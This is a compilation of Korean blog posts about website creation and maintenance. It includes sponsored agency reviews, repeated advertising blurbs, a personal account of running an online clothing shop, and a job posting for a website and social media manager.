보통은 비싼 쪽으로유도할 뻔도 한데 그러지 않고저희 회사에 딱 맞는 제안을 해주신다는 점이굉장히 믿음직스러운 곳이었어요.최대한 비용을 아낄 수 있으면서원하는 홈페이지 구현할 수 있도록 제안해주셔서 그렇게 진행하기로 결정했어요. 제가 홈페이지를 제작을 진행하기 전까지는반응형홈페이지에 대해 잘 모르고PC랑 모바일을 각각 진행할 생각이었는데요.제가 필요한 홈페이지를 크게 개발이 필요하거나난이도 있는 경우가 아니기 때문에비용을 아끼기 위해서는 반응형으로진행하는 것이 좋겠다고 제안해주시더군요.그래서 PC와 모바일을 한번에 해결될 수 있는반응형으로 홈페이지를 제작하기로 했어요. 홈페이지를 잘 제작하기 위해서는업체와 많은 이야기를 하는 것이 중요해요.그렇기 때문에 커뮤니케이션도 굉장히 중요한데요.기획부터 개발 및 홈페이지 오픈까지 진행 단계별로 의논할 부분이 굉장히 많을 수 밖에 없어요.만약에 커뮤니케이션이 원활하지 않을 경우 예상했던 납기 기한보다 더 연장되는 불상사가 생길 수 있고 전체적인퀄리티가 떨어질 수 있다고 해요.그렇기 때문에 충분한 커뮤니케이션은 필수에요.​ 그런 부분에 있어 희명웹은 원활한 커뮤니케이션을 위해1:1 전담 매니저를 배정하여원활한 커뮤니케이션이 이뤄질 수 있도록체계적인 프로세스를 운영되고 있어요.덕분에 진행하는 과정 내내홈페이지 관련하여 많은 이야기를 할 수 있었어요.사업 준비 때문에 정신 없었지만좋은 홈페이지를 적극적으로 협조했구요.덕분에 원하는 방향으로 반응형홈페이지를 진행할 수 있었어요. 보통 이 정도 퀄리티의 홈페이지라면 비용이 꽤나 들거라 생각했는데굉장히 합리적인 비용으로 진행해주셔서비용대비 높은 퀄리티의 반응형홈페이지를 만나볼 수 있었어요.진행하면서 몇 가지 수정 요청도 드렸는데바로 바로 반영해주셔서 지인 추천대로 여기서 진행하기 잘했다는 생각이 들어요. 희명웹은 전문 인력을 기반으로 체계적인 프로세스를 운영하고 있기 때문에예상 납기일을 넘기지 않고 딱 맞춰 진행해주셨어요.간혹 일정 잘 못 맞추는 그런 곳도 있다고 하는데희명웹은 정말 딱 맞춰 진행해주시더군요.충분히 일정을 소화해주셔서덕분에 오픈하기로 마음 먹었던 날짜에무사히 오픈 할 수 있어 좋았어요. 확실히 제대로 된 홈페이지를 하나 만들어 놓으니사업에만 온전히 집중할 수 있어서 좋았아요.아무 홈페이지가 없었다면 구구절절 설명해야 되는 부분이 많았을텐데잘 만든 홈페이지 하나로 그 부분을 생략할 수 있어진행하길 참 잘 했다는 생각이 들어요.그리고 반응형이라 모바일에서도제대로 구현되기 때문에요즘 같은 시기에 딱 맞는 홈페이지가 아닐까 싶어요.만약에 저처럼 홈페이지 개발이 필요 없고기본적인 홈페이지를 제작할 계획이라면희명웹과 같은 전문 웹에이전시를 통해홈페이지제작업체를 진행해보는 것은 어떨까 싶네요.충분히 만족할 수 있는 결과를 얻지 않을까 싶어요. 희명웹http://hmweb.kr/#홈페이지제작업체 #희명웹​[ 본 포스팅은 업체로부터 소정의 원고료를 지원받아 작성되었습니다 ]  흥미롭지? 홈페이지관리홈페이지 부가서비스에 관한 꿀팁스타작가 공지영의 에세이에 러시아의 초원에 사는 얀과 항상 신세만 지는 친구 카와카마스의 이야기가 나옵니다. 매번 얀의 것을 가져가고 보답도 하지 않는 카와카마스가 저는 너무 미웠거든요.그런데 공지영 작가가 말하길 “이 이야기가 아름답다고 생각하지 않는다면 당신에겐 필요한 것”이라고하더군요. 여러분은 어떤가요? 저 말처럼 휴식이 필요하진 않으신가요? 저와 함께 홈페이지제작및관리에 관한 정보를 보며 잠시 쉬어가도록 해요~기본적인 솔루션형 웹상의 경우, 저가의 단가로 주문제작할 수 있지만디자인이나 팝업창, 텍스트 교정이 까다로울 수 있습니다.따라서 대출회사와 인터넷상의 특색에 지속적으로 합당한 웹싸이트 관리가 필요하거나지속적인 AS서비스가 알맞은 사이트 경우, 적합한 서비스를 넣고 찾아보는 것이 좋습니다로그분석에 사용하는 액세스로그는 자사의 홈페이지에 접속한 방문객들이 홈페이지를 돌아다니며 요청했던 파일들을 기록해 놓은 로그입니다. 액세스로그의 자료를 분석하여 홈페이지에 접속한 고객층의 선호도를 파악할 수도 있습니다.로그분석의 경우 인터넷 페이지의 운영 형태나 마케팅 전략을 수립하는 자료로 활용될 수 있습니다.로그분석은 웹페이지의 실적을 측정할 시에 필요한 방문자 정보, 트래픽, 사이트 이동 경로 등의 데이터를 확인할 수 있는 분석 수단으로 이를 적용하여 사이트 보안이나 이벤트, 유입 전략 등을 구축할 수 있습니다.전자 결제서비스의 경우, 결제시스템을 사용하여 카드결제나 시시때때 계좌이체 같이 신속히 가늠 할 수 있습니다.또한, 매출의 집계나 결제 내역을 관리할 수 있는만큼 편리합니다.홈페이지 제작 업체 선정에 관한 정보, 여기에 다 있다!홈페이지 제작한 뒤에 문제가 발생한 상황에는 보수가 무상으로 진행될 수 있으므로, 계약 시 하자 보수와 관련한 무상 이행 여부를 꼼꼼히 살펴보는 것이 바람직합니다.어떤 업체의 경우, 홈페이지 제작을 수주하면 별도의 금액 없이 국내의 다양한 SNS사이트와 연동해 주는 서비스를 지원하고 있어 홈페이지의 효율을 높이고 있습니다.홈페이지 제작을 맡길 때는 홈페이지 제작 업체가 보유하고 있는 포트폴리오를 깐깐하게 살펴보고, 업체의 경력을 자세히 파악하는 것이 중요하며,홈페이지 제작을 의뢰했을 경우, 홈페이지를 무료로 만들어준다고 하고 이후의 유지보수비와 홈페이지 임대료를 요구하는 회사도 있다고 합니다. 빈틈없는 계약 조건 확인은 필수겠죠?저렴한 가격으로 홈페이지를 제작해 주는 업체 중에는, 운영 관리가 허술할 뿐 아니라 홈페이지 내용의 추가나 변경 요청 시추가 결제를 제시하는 경우도 있으므로 주의해야 합니다.온라인 창업의 필수조건, 홈페이지! 만들긴 만들었는데, 관리가 까다롭다고요?홈페이지 제작에서 사후관리, 유지보수, 마케팅까지 모두 한꺼번에 해결해 드리는 다브가 모두 책임지겠습니다!다브는 홈페이지 제작은 물론 관리자 모드를 설치, 업데이트나 수정사항을 고객님 스스로설정할 수 있어 관리비 부담이 없습니다. 또한, 제작에 드는 비용이 무료! 호스팅 비용만으로모바일 홈페이지까지 한꺼번에 제작할 수 있는 실속 있는 혜택도 제공하는데요.또한 다국어 시스템을 구축한 자동 번역 쇼핑몰 페이지도 제작, 해외에서 효율적인 쇼핑몰 솔루션으로 가성비 최고를 자랑합니다.홈페이지 설치 후 컴퓨터에 대해 전혀 모르시는 고객도,마케팅 솔루션을 분석하고 싶은 고객도 다브와 함께라면 문제 없습니다. 지금 문의하세요!착한 가격으로 쉽고 빠르게 홈페이지, 쇼핑몰 제작홈페이지제작및관리에 대해 공부하니 시간이 벌써 이렇게나 흘렀네요. ^^맛있는 차 한 잔 마시며 공부하기 정말 좋은 요즘, 제 블로그를 통해 도움되는 정보 얻어가시길 바랄게요.쇼핑몰 인수가 끝나고, 본격적으로 쇼핑몰 운영을 위해 해야하는 일들이 있다!사입도 해야하고, 촬영도 해야하고, 모델 구하고, 홈페이지도 관리하고... 업로드하고..사실 한 번 해보면 감이 잡히는데, 처음이 힘들고 시간도 오래걸린다!나는 그래도 소셜 md를 해보고 스토어팜 운영을 해봐서 쪼금 더 수월했고같이 일하는 사람이 개발자 출신이라 카페24로 홈페이지 다듬기도 편했따. 1. 동대문 사입하기동대문 사입은 예전처럼 옷을 쌓아놓고 팔 필요가 없다.신상마켓 이라는 어플을 통해서 한개씩도 주문이 가능하기 때문이다!대신 사입 수수료(배송비라고 생각하면 편하다)가 3-4000원 정도 필요하다.옷을 쌓아놓고 파는 건 아니지만, 샘플 요청은 꼭 필요하다. 사진 촬영을 위해서!​ 사입&샘플 요청은 두가지 중 하나를 선택해서 하면 된다.첫번째, 사입삼촌 구하기두번째, 사입삼촌 없이 발로 뛰기나는 사입 삼촌 없이 두번째 방법으로 먼저 진행했는데, 이유는사입삼촌 월급이 한달에 60-70만원 정도 드려야하기 때문이다.아직 초창기이고 수익이 날지 안 날지도 모르는데무턱대고 사입삼촌을 쓰기에는 리스크가 있을 것 같아 직접 동대문에 가기로 했다.   나는 다행히 쇼핑몰을 인수한 거였기 때문에 신상마켓에 어플 아이디까지 받았고,그 전 거래처와 미리 연락해서 샘플 요청을 해놨다.내가 인수한 쇼핑몰은 3-4달 정도 휴식기가 있었기 때문에 업체들이 쉽게샘플을 내어주려고 하지는 않았다. 이 업체는 다행히 샘플 요청을 미리 수락해주셨는데, 아닌 업체들이 훨씬 많았다.영업은 정말 내 성격에 넘 힘들었는데, (아쉬운 소리 하는 게 싫었다)솔직히 이렇게 카톡이나 전화로 연락하는 것보다 얼굴 보고 부탁드리는 게 훨씬 낫다!잰 : 저희 이번에 진짜 열심히 하려고 하는데.. 혹시 샘플 제공 어떻게 안될까요..? ㅠㅠ잰 : 저희 정말 사진 잘 찍어드릴 수 있거든요! 한 번만 안될까요..? ㅎㅎ..이런 식으로 영업했다.많은 사람들이 했던 조언이, 동대문 가서는 센 척 하면서 갑질한다는 느낌으로샘플 하나만 주세요 ㅋ주실 수 있죠? ㅋ이렇게 말하라고 했는데도저히 그런 말은 잘 안나오기도 하고, 그냥 내 이미지대로 밀고 나가자 했는데결론적으로는 내 이미지대로 나가는 게 잘 먹혀들어갔다.내가 불쌍하게 생기긴 했나봥 ㅎㅎ 2. 사진 촬영하기나는 어떤 사진을 찍던, '채광'이 최고라고 생각한다.예전에 푸드 스타트업에서 마케팅팀에서 일할때에도, 음식사진도 무조건 채광!지금 뷰티 커머스에서 일할때에도 채광이 예쁘구단테 사진도 채광이 좋고 내 인스타그램에 올릴 사진도 채광이 들어간 게 좋아!채광을 대체할 수 있는 조명은 진짜 진짜 없다.사진 스킬이 부족하다고 느끼시는 분들은 스튜디오 말고꼭 야외 촬영해보세요! 저 한번 믿어보십시오~~~~!그래서 첫 촬영은 야외로 나갔다!   다행히 모델, 그리고 같이 일하는 언니 둘다 차가 있어서옷 넣을 공간은 넉넉했고 촬영 전에 옷 주름필 겸, 코디도 할 겸 이렇게 걸어놨다.회사가 청담동이고 주변이 예뻐서 쇼핑몰 촬영 많이 오는데,다들 이렇게 해놓더라구~~~! 한 번 따라해봤는데 편하긴 편했다!   아니 이것보세요~채광 내가 왜 좋다고 말하는지 알겠죠?이 사진은 정말 너무 마음에 들어서 쇼핑몰 메인에도 걸어놓고홍보할때도 무조건 이 사진으로!일단 이런 포즈를 취했던 모델의 센스도 대단하다고 생각했고옷 분위기, 배경 너무 다 잘 어울린다.(근데 우리 언니 남자친구는 공동묘지냐고 했음 ㅠㅠ왜저래!!)​아 그리고 모델 구하는 방법은~사실 알바몬이나 알바천국 통해서 구인구직 해도 되지만나는 다행히도 친한 동생 중에 피팅 경력 있는 동생이 있어서 부탁했다.나보다도 열정 넘치고 잘 도와주는 고마운 동생이당.지금은 태가나를 다른 사람이 운영하고 있찌만,(이건 나중에 다시 포스팅)아직도 이 동생한텐 넘 고마워서 자주 연락하려고 하고 근황 토크를 하려고 하는 편!!어제두 우리 언제 만날거냐고 카톡했는데 선뜻 주말에 만나자고 해줘서 참 고마웠따!!!   얘가 정말정말 말랐는데, 183에 62? 였나? 근데 사진 찍으면 그렇게까지 말라보이지도 않는다.그래서 연예인들이 살을 엄청 빼나보다. 딱 핏이 예뻐보이게 나온다! 내가 좋아하는 스타일은 아니긴 하지만 기존 쇼핑몰 느낌을 최대한 살려야해서예전 느낌과 비슷한 옷의 샘플을 많이 받아왔다. 운영을 오래 하면서 점점 내 취향을 넣어가려고!이제 스튜디오 촬영 컷을 보여줘야겠다.   ㅠ.ㅠ이것보라고... 채광이랑 달라..일단 흔들림이 생긴다. 채광이 없으면!그리고 색감도 쨍하게 잘 안 잡히고, 애매한 느낌?   스튜디오에서 촬영하더라도, 해가 나는 시간에 찍으면 괜찮았을 텐데우리 다같이 시간 맞는 게 저녁 밖에 없어서 어쩔 수 없이 이렇게 되었다.이 촬영하면서 약간 음.. 재촬영 각이다! 이렇게 생각하고 촬영했기 때문에큰 미련 없이 최선을 다할 수 있었다. ^^..   근데 스튜디오 촬영의 좋은 점 하나는 상세컷 촬영은 잘 나온다.배경이 흰 배경이기 때문에!야외 촬영을 할 때는 상세컷을 따로 찍었다.   이 상세컷은 같이 일하는 언니의 집에서 찍었던 사진! 야외 촬영 후 상세 촬영 이렇게 두가지 과정이 필요하지만 그래도 야외촬영 추천해요!   감각적이야~ 내 감성 잔뜩 넣어서 촬영할 수 있기 때문에 사진 촬영이 젤 재밌다.(동대문 사입이 제일 힘들고)사진 참 잘 찍은 것 같다(자화자찬)   내가 이번에 알게 된건데, 아이폰 기본 앱 중에 측정 어플이 있다.줄자로 일일이 사이즈 재기 힘들때 이렇게 측정 어플 이용해서 사이즈 재면 편리행!그리고 기록도 이렇게 해놓으면 되니까 나중에 옮겨놓기도 좋다.세상 언제 이렇게 좋아졌어.. 난 이 세상 못 따라가겠는데....​ 3. 홈페이지 관리  다 됐으면 이렇게 상품 업로드를 해본다. 내 쇼핑몰은 카페24 호스팅 페이지를 사용했다.PC로 봤을 때 잘 보이는지, 모바일로 봤을 때 잘 보이는지 둘다 확인 필수!간과하기 쉬운 점이, 보통 쇼핑몰에 업로드 할 때 PC를 사용하니까 PC에서만 잘보이면끝인 줄 알 수도 있는데 대부분의 이용자들은 모바일 이용자들이기 때문에무조건 모바일에서 확인하는 것을 습관화 해야한다.   업로드 전 이렇게 레이아웃 짜고, 여백, 폰트 등상세페이지 디자인을 하는 작업도 필수!사진 편집 외에는 다른 디자인 작업은 안 들어가도록 했다.왜냐? 난 투잡이니까... 디자인 작업 많이 들어가면 힘들 것 같아서!그래서 원래 스토어팜 운영할때는 무조건 다 디자인작업으로 했는데이번에는 타이핑으로 결정했다!폰트만 잘 고르면 나쁘지 않다고 생각~~~   썸네일 예쁘게 고르는 것도 중요하다.썸네일을 잘 뽑아야 사람들이 상세페이지도 보러 들어오고, 구매로도 이어지니까~아 나 이러니까 좀 전문가같네? ㅋ헤헹쇼핑몰 이름 가리기 이제 귀찮아서 안 가리겠다. 볼 사람은 보세요~   쿠폰 만드는 작업도 필요!나는 디자인 작업을 좋아하기 때문에 이 작업도 꽤 즐겁게 했다!재밌었엉~~ㅎㅎㅎㅎㅎㅎㅎㅎ​​오늘은 여기까지! 팔아파~~다음에는 SNS광고, 마케팅 포스팅 해야겠다. 안녕~질문은 언제든 환영입니당! 안녕하세요 교육원 홈페이지제작 업체 학원사랑넷입니다.^^무슨일을 시작하더라도 마케팅은 빠질 수 없는 중요한 운영요소중 하나입니다.교육원을 개원하고 교육원을 알리기 위한 마케팅을 위해 다양한 방법을 사용하고 있습니다.그중에 빠질 수 없는것이 바로 홈페이지입니다! 온라인 마케팅을 위한 첫 시작이 홈페이지가 없으면 안돼죠!!홈페이지가 흔해졌다지만 홈페이지가 없는 곳은 온라인 마케팅의 영향력이 현저히 떨어집니다.​마케팅의 타이밍은 참 중요합니다. 그렇기 때문에 이제 개원한 교육원에서 홈페이지 서비스를 빠르게 진행하며 마케팅을 해야지만 더욱 강력한 효과를 누릴 수 있죠!​마케팅을 위한 첫 시작인 교육원 홈페이지 제작을 효과적인 홈페이지 제작과 빠른 진행을 할 수 있는 학원사랑넷을 알려드릴께요​마케팅을 진행하기 위해서는 비용이 만만치 않게 들어갑니다. 학원사랑넷은 부담스러운 제작비의 거품을 줄이고 합리적인 제작을 진행하고 있어 33만원의 제작비와 월 22,000원의 비용으로 제작과 관리를 진행할 수 있어 비용적인 메리트가 큽니다 :)​ 이런 합리적인 비용으로 서비스할 수 있는 능력은 20년 이상 홈페이지 제작을 해온 학원사랑넷의 오랜 노하우로 인한 결과라고 할 수 있습니다.수년 동안 수많은 제작과 운영을 하면서 제작에 대한 과정을 효율적으로 진행할 수 있는 방법을 만들어냈고 운영 또한 노하우가 접목된 관리 시스템을 통해 쉽고 간편하게 관리가 가능하게 서비스 하고 있습니다. 여기에 하나더~!! 10년 이상 함께 해온 베테랑 디자이너들의 퀄리티 있는 디자인 컨텐츠를 통해 한층 더 좋은 홈페이지 서비스를 할 수 있게 되었습니다. 교육원홈페이지제작 학원사랑넷은 좋은 디자인을 스마트한 시대에 맞는 좋은 시스템에 적용하여 홈페이지 서비스를 진행하고 있어 홈페이지를 어디서든 자유롭게 사용할 수 있도록 반응형 홈페이지 기반으로 제작을 하고 있습니다. 그래서 PC / 태블릿 / 스마트폰 어디든 문제없는 사용이 가능한 홈페이지를 제작하고 서비스 합니다. :) 온라인 마케팅시 홈페이지제작만 하고 반짝 하는 마케팅은 오래가질 못합니다. 이 홈페이지가 잘 운영이 되고 신경쓰는 홈페이지인지 아닌지는 고객이 더 잘 알고 있습니다. 학원사랑넷은 반짝 제작만 하고 점차 사라지는 홈페이지보다는 꾸준히 운영될 수 있는 홈페이지를 위해 서비스 하고 있습니다. 그래서 누구나 쉽고 편하게 홈페이지를 관리 할 수 있는 관리 시스템을 함께 제공하고 있습니다.홈페이지 수정 시스템은 디자인 컨텐츠를 직접 수정할 수 있는 관리 시스템을 통해 문구 및 사진과 각종 메뉴들을 자유롭게 수정할 수 있습니다. 팝업 관리만 해도 홈페이지가 활동성있게 보여지는데 공지와 이벤트 안내를 위한 팝업도 다양한 팝업 샘플과 간단한 문구 수정만으로 팝업을 쉽고 빠르게 만들어 낼 수 있는 팝업 제작 시스템으로 홈페이지 운영이 더 쉬워집니다. 학원사랑넷은 홈페이지 관리와 활성화를 위해 다양한 기능들을 제공하며 서비스 하고 있습니다.회원가입시 알림 기능과 홈페이지를 수정 관리할때 실수를 하더라도 저장되어 있던 컨텐츠를 버튼 한번으로 다시 복구할 수 있어 부담없이 관리할 수 있도록 편의 기능이 있으며 비대면이 강조되는 현 코로나 시대에 맞는 온라인 강의 시스템까지 서비스가 가능해 교육원홈페이지제작과 온라인 강좌 서비스를 계획하신 곳도 학원사랑넷은 서비스가 가능합니다. :) 학원사랑넷은 항상 트렌드를 읽고 대응하고있습니다.흐름이 빠른 IT 트렌드를 항상 민감하게 파악하여 반영하는 홈페이지 시스템은 지속적으로 변화하며 스마트한 시대에 맞춰 가고 있습니다. 온랑인 마케팅의 첫 걸음 홈페이지제작을 학원사랑넷과 진행하여 좋은 홈페이지와 좋은 마케팅의 시작 두가지 모두를 해결 할 수 있습니다.지금 상담 받아 보세요 ^^ 학원사랑넷학원 홈페이지 제작, 스마트폰 홈페이지, 쉽고 편한 관리 시스템www.hakwon-love.net ​  ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가홈페이지관리 정보 속으로모바일 홈페이지 제작, 철저하게 알아보자!제가 자주 듣는 락밴드 노래 중에 ‘별일 없이 산다’라는 음악이 있는데요.지금처럼 다들 어려울 때에는 별일 없이 산다는 말 만큼 반가운 말도 없다고 합니다. 그러니까 오늘 하루도 별일 없었다고 섭섭해하지 마세요~제가 아쉬운 마음 싹 날려버릴 홈페이지제작및관리 핫한 정보 드리겠습니다^^모바일 페이지를 제작할 때 반응형 웹 형태로 만드는 것이 좋습니다.반응형 웹으로 구성한 페이지는 각종 태블릿 및 다양한 모바일의 해상도에 알맞은 비율로 제공 가능하므로 가독성이 높다는 장점이 있기 때문입니다.모바일 홈페이지 제작의 중요성이 커진 만큼 많은 분들이 대행업체를 통해 제작을 진행하고 있습니다.계약 전 오타에 대한 부분은 무조건 대행업체의 책임으로 하여야이후 오타 수정으로 인한 비용이 생기는 것을 막을 수 있습니다.모바일에 최적화된 모바일 홈페이지의 경우, 추가로 모바일 버전 사이트를 운영하는 것과 PC버전의 홈페이지가 스마트폰에서 호환되는 두 가지 방법이 있으며,최근 대행업체를 통해 금액을 추가로 청구하지 않으시더라도 무료로 직접 원하는 모바일 웹페이지를 형성할 수 있는 시스템들이 개발돼 많은 개인사업자의 환영을 받고 있습니다.모바일 싸이트 제작 시에는 초기 계약 비용도 중요합니다. 계획없이 저렴한 곳만 찾아서 할 경우에는 이후 추가 비용이 2배로 발생되거나 느린 피드백으로 시간낭비를 하게될 수 있습니다.홈페이지 제작, 현명하게 파헤쳐보자!무료로 사이트를 만들 수 있는 사이트가 존재하기 때문에 어느누구나 어렵지않게 만들 수 있지만, 어떤 컨텐츠를 어떤 용도로 활용하느냐에 의해 잘 만든 홈페이지와 그렇지 못한 페이지로 갈립니다.온라인 사이트를 계획할 때는 홍보용으로 활용될 것인지, 판매용으로 사용할 것인지 홈페이지의 용도와 목적을 명확하게 정한 후, 메뉴 구성과 컨텐츠를 배분하는 것이 좋습니다.홈페이지를 제작하는 데에는 본인이 하거나, 홈페이지 회사에 발주하는 등 여러가지 종류의 방안이 있습니다. 하지만 요새는 웹싸이트 만들기가 너무나 쉬워졌기 때문에 딱히 자금을 쓰지 않고 웬만한 구색은 갖출 수 있습니다.      무료 계정으로 홈페이지를 제작하면, 각기 ID와 인터넷 주소를 부여 받게 되는데, 무료제공업체들의 출처로 주소가 주어지게 되는 단점이 있으며,온라인 마케팅을 진행하는 기관들은 시간이 흐를수록 치열해지는 경쟁 상황 가운데, 보다 차별화된 마케팅 전략을 만들기 위해 노력하고 있습니다.온라인 창업의 필수조건, 홈페이지! 만들긴 만들었는데, 관리가 까다롭다고요?홈페이지 제작에서 사후관리, 유지보수, 마케팅까지 모두 종합적으로 해결해 드리는 다브가 확실하게 책임지겠습니다!다브는 홈페이지 제작은 물론 관리자 모드를 설치, 업데이트 및 수정사항을 고객님 스스로설정할 수 있어 관리비용 부담이 없습니다. 또한, 제작에 드는 비용이 무료! 호스팅 비용만으로모바일 홈페이지까지 동시에 제작할 수 있는 경제적인 혜택도 제공하는데요.또한 다국어 시스템을 구축한 자동 번역 쇼핑몰 사이트도 제작, 해외에서 효율 높은 쇼핑몰 솔루션으로 놀라운 가성비를 자랑합니다.홈페이지 설립 후 컴퓨터를 전혀 모르시는 고객도,마케팅 솔루션을 분석하고 싶은 고객도 다브와 함께라면 쉬워집니다. 지금 문의하세요!착한 가격으로 쉽고 빠르게 홈페이지, 쇼핑몰 제작홈페이지제작및관리에 관한 깨알 자료들! 많은 도움이 되었나요?계속해서 많은 자료를 드릴 수 있게 이웃추가 해주세요!영양가 있는 정보로 금방 돌아오겠습니다~네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가나만 몰랐던 홈페이지관리 이야기홈페이지 백업에 대해 꼭 기억하세요!오늘 며칠인지 아세요? 혹은 무슨 요일?대답이 바로 안나오셨다구요? 자책하지 마세요. 당연합니다. 저도 그래요.근데 한 연구결과에 따르면, 가장 떠올리기 어려운 요일이 바로 ‘수요일’ 이라고 합니다.가장 특색이 없어서 그럴까요? 그래도 수요일만 지나면 한 주가 다 지나가는 것 같은데 말이죠.어쨌거나 오늘은 일생에 단 하루밖에 없는 날! 이라는 것 잊지마시구요~오늘도 알찬 홈페이지제작및관리알짜 정보 알아볼게요^^홈페이지 제작 완료 후 부족한 부분을 정리해나가다보면 수정한 부분이 마음에 들지 않아 처음의 상태로 되돌아가고 싶은 경우가 있기 때문에 꼭 백업을 해두는 것이 좋습니다.자신이 제작한 홈페이지의 계정 공간에 보유한 파일들을 올리는 방법은 내 개인컴퓨터에에 저장되어 있는 파일을 웹 서버로 보내서 저장하는 것입니다.홈페이지 관리 중 컨텐츠나 페이지를 부주의로 지웠을 상황을 대비해 백업 작업은 필수입니다.홈페이지를 명확하게 백업해 놓았다면 언제든지 복구가 가능합니다.어느 정도 회사 스케일이 있는 웹호스팅 기업들은 자체 백업 프로세스가 있으므로업체 결정 시 고려하시기 바라며제작완료된 홈페이지를 다른 사람에게 보여지게 하기 위해서는 웹 서비스가 가능한 홈페이지의 서버에 내 홈페이지 파일을 올려야 하는데요, 이 때 서버라는 건, 클라이언트의 요청에 응답하는 프로그램을 일컫습니다.홈페이지 제작 업체 선정, 세세히 파헤쳐보자!홈페이지 관리업체를 고를 때 오타, 프로그램 오류복구, 팝업 이미지 제공 등과 같은 기본적인 홈페이지 유지 보수가 제공되는지 체크해 보아야 합니다.몇 업체의 경우, 홈페이지 제작을 수주하면 별도의 과금 없이 국내의 여러 SNS사이트와 연동해 주는 혜택을 실행하고 있어 홈페이지의 홍보효과를 늘리고 있습니다.저렴하게 홈페이지를 만들어 주는 웹사이트 중에서는, 홈페이지 관리가 상세하지 못할 뿐 아니라 홈페이지 내용의 추가나 변경 요청 시별도 결제를 요구하는 경우도 있으므로 주의해야 합니다.홈페이지를 제작할 경우에는 그 방법과 비용, 기간, 방향이 업체마다 모두 다르기 때문에 업체가 기대하는 사업의 지향점을 상세히 전달해야 하며,비용을 들이지 않고 홈페이지를 만들 때는 업체가 중단없이 안정적으로 서비스를 제공하는지, 또는 얼마나 빠른 웹 서버 속도를 제공하는지를 중요하게 생각해야 합니다.온라인 창업의 필수, 홈페이지! 만들긴 만들었는데, 관리가 까다롭다고요?홈페이지 제작에서 사후관리, 유지보수, 마케팅까지 토탈로 해결해 드리는 다브에 맡겨 보세요!다브는 홈페이지 제작 외에도 관리자 모드를 설치, 업데이트나 수정사항을 고객님 스스로설정할 수 있어 관리비용 부담이 없습니다. 또한, 제작에 드는 비용이 무료! 호스팅 비용만으로모바일 홈페이지까지 동시에 제작할 수 있는 푸짐한 혜택도 제공하는데요.또한 다국어 시스템을 구축한 자동 번역 쇼핑몰 사이트도 제작, 해외에서 효율 높은 쇼핑몰 솔루션으로 뛰어난 가성비 자랑합니다.홈페이지 구축 후 컴퓨터에 대해 아무것도 모르는 고객도,마케팅 솔루션이 궁금한 고객도 다브와 함께라면 쉬워집니다. 지금 문의하세요!착한 가격으로 쉽고 빠르게 홈페이지, 쇼핑몰 제작금연하는 분들! 또는 달콤한 초콜릿과 밀가루를 참아가면 살을 빼는 여러분!유혹과 짜증을 참느라 힘드시죠?. 이럴 때 마음을 채워주는 무언가가 있으면 조금견딜 만 하다고 합니다. 이렇게 다른 걸로 채워가다 보면 뭔지 모를 부족함이 사라지는 날이 올 거예요!오늘 같이 본 홈페이지제작및관리! 이웃분들의 스트레스를 풀어줬기를 바라며 여기서 마칠게요!  제가 PR Director 이자 파트너 코치로 함께 하고 있는 CiT 코칭연구소에서 홈페이지 및 SNS 관리를 담당해 주실 분을 기다리고 있어요!특히 재택근무를 기본으로 하기 때문에  육아 문제로 경력을 잠시 멈춤 상태이시거나 다시 일하고 싶으신 관련 업종 유경험자 분들께 정말 좋은 기회일 것 같아 함께 홍보 합니다 :) ​2020년에는 코칭의 대중화를 위해서 설레는 일들을 또 많이많이 기획하고 있어요~~함께 즐겁게 일 하실 분!  기다립니다!  (주)CiT코칭연구소와 함께 하실 분을 기다립니다. 안녕하세요? 성장을 지원하는 Creative Partner CiT코칭연구소입니다. ​저희 ㈜CiT코칭연구소에서는 2020년을 준비하면서 보다 탄탄한 교육 서비스를 제공하고자 홈페이지 운영과 SNS에 날개를 달아줄 새로운 인재를 모시고자 합니다.  1. 채용 분야: 홈페이지 & SNS 기획 관리 책임자 2. 지원 자격 - 소통 마인드 - 홈페이지 운영 능력 3. 우대 조건 - 홈페이지 및 SNS 운영 유경험 자 - 코칭에 이해가 있는 자 4. 근무 조건 - 월요일 오전 출근(9:30-12:00), 화-금 재택근무(2시간/일) - 급여 협의 5. 지원 방법- 이력서와 자기소개서 보내기- limjcoach@naver.com 임민정 부사장​​ [채용] 홈페이지&SNS기획 관리 책임자(재택근무) > 공지사항 | CIT코칭연구소공지사항 홈 > CiT소개 > 공지사항 [채용] 홈페이지&SNS기획 관리 책임자(재택근무) 페이지 정보 작성자 CiT코칭… 댓글 0건 조회 40회 작성일 19-11-29 15:20 본문 (주)CiT코칭연구소와 함께 하실 분을 기다립니다. 안녕하세요 ? 성장을 지원하는 Creative Partner CiT 코칭연구소입니다 . ​ 저희 ㈜ CiT 코칭연구소에서는 2020 년을 준비하면서 보다 탄탄한 교육 서비스를 제공하고자 홈페이지 운영과 SNS 에 날개를 달아줄 새로운 인재를 모시고자 합니다 . 1. 채용 분야 : 홈페이지 & SNS...www.citkorea.co.kr ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가 홈페이지 관리 잘하는 법  10년이상 홈페이지 제작한 경험이 있는 저희 지앤글로벌....저희를 찾아주시는 분들이 많이 질문하십니다.... 홈페이지 제작도 어렵지만 그후의 관리도 너무 어려워요! 관리 잘하는 비법 뭐 없을까요? 입니다.... 홈페이지를 공들여서 제작했지만,관리하기도 쉽지 않고이 홈페이지를 어떻게 활용해야 할까...생각하면 머리가 아파옵니다....ㅎㅎㅎㅎ 그래서 저희는 고객분들과 방문 상담을 할때꼭 고객분들꼐 여쭤보는 부분이 있습니다.     바로  why?홈페이지를 제작하는 목적이 무엇인가요? 입니다. 이런 질문의 대부분의 답변들은.... "새롭게 리뉴얼해서 사업(회사)을 키워보려구요..." 입니다.간단히 말하자면 수익창출, 매출상승이라고 할 수 있겠죠. 그렇다면 이말은 즉슨, 홈페이지라는것 자체가 매출과 직결되야 한다는 말이기도 한데...홈페이지가 한 기업에 있어 상당히 중요한 부분이 되겠죠?또한 매출상승이 금방금방 오르는 것이 아니기 때문에 결국....홈페이지제작이 결코 간단하게 생각할 부분이 아니라는 말이기도 합니다^^  기업과 관련된 전반적인 전략, 마케팅이 접목된 홈페이지로 구상을 하시고 계획 하셔야 합니다.그래야만 성공적인 매출상승으로 이어질 수 있고, 효과적인 홈페이지 제작이 되실 겁니다. 아무런 계획없이..그냥 남들다 하는데..있어야 하지 않을까? 라는 생각보다는,본인의 사업을 더 키워줄 수 있을지도 모른다는 가능성을 염두해 두시고제작에 임하시면 좋을 것 같습니다^^  홈페이지 제작이라는게, 사실 결코 쉬운 부분은 아닙니다.많은 정성과 시간과 노력을 깃들여야 하는 